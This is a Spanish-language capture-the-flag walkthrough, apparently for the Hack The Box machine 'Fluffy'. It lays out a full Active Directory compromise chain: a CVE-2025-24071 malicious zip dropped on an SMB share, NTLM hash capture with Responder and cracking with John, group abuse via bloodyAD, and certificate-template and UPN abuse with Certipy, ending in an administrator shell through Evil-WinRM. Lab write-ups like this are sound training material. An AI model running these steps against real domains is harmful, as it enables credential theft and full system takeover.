### Post scan 

- Desactivamos **la sincronización automática de la hora del sistema a través de NTP (Network Time Protocol)** y la sincronizamos con sincroniza la hora local con la del servidor objetivo (`10.10.11.69`) 

``` bash 
sudo timedatectl set-ntp false #True Para activar.
sudo ntpdate -u 10.10.11.69
```

- Explotación de la vulnerabilidad CVE-2025-24071, esto ya que tenemos acceso mediate las credenciales dadas a  el SMB. El exploit genera un archivo `.zip` malicioso con una reverse shell, especificando tu IP local (`-i yourip`) y el tipo de carga (`-f revshell`).

``` bash 
git clone https://github.com/ThemeHackers/CVE-2025-24071
cd CVE-2025-24071

python3 exploit.py -i yourip -f revshell
```

- Posterior Iniciamos con **Responder**, una herramienta para capturar hashes NTLM. Usando `-I tun0` especificando la interfaz (HTB).

``` bash 
sudo responder -I tun0 -v
```

- Se sube el `.zip` malicioso al recurso compartido `\\10.10.11.69\IT` utilizando las credenciales proporcionadas. Esto fuerza a la máquina víctima a procesar el archivo, lo que eventualmente dispara una conexión SMB hacia ti (capturada por Responder).

``` bash 
smbclient //10.10.11.69/IT -U j.fleischman%J0elTHEM4n1990! -c "put exploit.zip"
# alternativa 
smbclient //10.10.11.69/IT -U j.fleischman
smb: \> put exploit.zip
```

- Revisamos el Responder y guardamos el El hash de `p.agila` : `echo 'p.agila:<hashcapturado>' > hash.txt`  , para posteriormente utilizar john

``` bash 
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

- Abuso de pertenencia a grupos (BloodHound): con `bloodyAD`, se agrega el usuario `p.agila` al grupo `Service Accounts`

``` bash 
bloodyAD --host 10.10.11.69 -d fluffy.htb -u p.agila -p 'prometheusx-303' add groupMember 'Service Accounts' p.agila
```

- Abuso de plantilla de certificados (ESC1 - ESC8): con `certipy shadow auto` abusamos de una **plantilla de certificados vulnerable** para obtener un **.ccache Kerberos** como `ca_svc`, sin conocer su contraseña.

``` bash 
certipy shadow auto -username P.AGILA@fluffy.htb -password 'prometheusx-303' -account ca_svc
```

### Enumeración y manipulación de cuentas con Certipy 

- Se configura el entorno para usar el ticket Kerberos de `ca_svc`.
Modificar la cuenta del administrador (técnica ESC6/ESC7):

``` bash 
export KRB5CCNAME=ca_svc.ccache
```

- Leemos la información del AD usando el hash NTLM del usuario `ca_svc`

``` bash 
certipy-ad account -u 'ca_svc' -hashes ':<NTLM_hash>' -dc-ip 10.10.11.69 -user 'ca_svc' read
```

- **userPrincipalName**: `administrator@fluffy.htb` , **el UPN fue modificado previamente** y ahora apunta a `administrator`, lo cual es clave en la explotación que veremos en las siguientes capturas.

![Descripción](/assets/img/articulos/P001/163653.png)

- Modificar la cuenta del administrador (técnica ESC6/ESC7): modificando el atributo `userPrincipalName` del usuario `ca_svc` para que sea  igual al del administrador.

``` bash 
certipy-ad account -u 'ca_svc' -hashes ':<NTLM_hash>' -dc-ip 10.10.11.69 -upn 'administrator' -user 'ca_svc' update
```

![Descripción](/assets/img/articulos/P001/ao.png)

### Solicitud de certificado para el administrador (ESC8) y Autenticación

- Solicitamos un **certificado** utilizando el template `'User'`, que te va a otorgar un certificado válido con el UPN `administrator@fluffy.htb`.

``` bash 
certipy-ad req -u 'ca_svc' -hashes ':<NTLM_hash>' -dc-ip 10.10.11.69 -target 'DC01.fluffy.htb' -ca 'fluffy-DC01-CA' -template 'User'
```

![Descripción](/assets/img/articulos/P001/163710.png)

- Configura correctamente el nombre principal del usuario para usarlo luego en autenticación por certificado

``` bash 
certipy-ad account -u 'ca_svc' -hashes ':<NTLM_hash>' -dc-ip 10.10.11.69 -upn 'ca_svc@fluffy.htb' -user 'ca_svc' update
```

![Descripción](/assets/img/articulos/P001/ao1.png)

- Se autentica con el certificado `.pfx` generado en el paso anterior. Este certificado permite **acceso completo como administrador**.

``` bash 
certipy-ad auth -pfx administrator.pfx -username 'administrator' -domain 'fluffy.htb' -dc-ip 10.10.11.69
```

![Descripción](/assets/img/articulos/P001/163731.png)

- Con acceso administrativo, se establece una sesión remota con **Evil-WinRM**, obteniendo control total sobre el sistema Windows objetivo.

``` bash 
evil-winrm -i 10.10.11.69 -u administrator -H '<NTLM_hash>'
```
